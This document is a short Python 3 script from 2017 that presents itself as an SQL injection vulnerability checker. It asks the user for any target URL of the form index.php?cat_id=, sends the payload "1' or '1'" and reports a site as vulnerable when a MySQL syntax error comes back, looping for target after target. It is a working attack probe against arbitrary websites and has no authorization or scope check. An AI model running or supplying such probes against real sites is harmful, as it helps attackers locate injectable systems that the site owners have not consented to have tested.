
import urllib.request

print("""
========================================================================================================
  _________________  .____    .__  ____   ____    .__           _________ .__                   __
 /   _____/\_____  \ |    |   |__| \   \ /   /_ __|  |   ____   \_   ___ \|  |__   ____   ____ |  | __
 \_____  \  /  / \  \|    |   |  |  \   Y   /  |  \  |  /    \  /    \  \/|  |  \_/ __ \_/ ___\|  |/ /
 /        \/   \_/.  \    |___|  |   \     /|  |  /  |_|   |  \ \     \___|   Y  \  ___/\  \___|    <
/_______  /\_____\ \_/_______ \__|    \___/ |____/|____/___|  /  \______  /___|  /\___  >\___  >__|_ \\
        \/        \__>       \/                             \/          \/     \/     \/     \/     \/
========================================================================================================
Description: A script that checks to see if a website is vulnerable to SQLi injections.
             Target must have index.php?cat_id= in URL.
Keywords: [Python 3, SQLi, Vulnerability Check]
Mar 2017 v1.0
by
NoDisassemble.me
-------------------------------------------------------------------------------------------------------
""")

while True:
    try:
        target = input("Enter Target Full URL: ")
        resp = urllib.request.urlopen(target + "=1\' or \'1\'")
        body = resp.read()
        fullbody = body.decode('utf-8')
        if "You have an error in your SQL syntax" in fullbody:
            print("")
            print("[!] Vulnerable to SQL Injection [!]")
            print("[!] Target: " + target + "")
            print("")
            input("Press Enter to try another Target:")
            print("")
            continue
        else:
            print("")
            print("[-] Target not Vulnerable to SQL Injection [-]")
            print("")
            input("Press Enter to try another Target:")
            print("")
            continue
    except ValueError as e:
        print("")
        print("[!] " + str(e) + " [!]")
        print("[!] Target URL must be full path http://www.site.com/index.php?cat_id= [!]")
        print("")
        continue
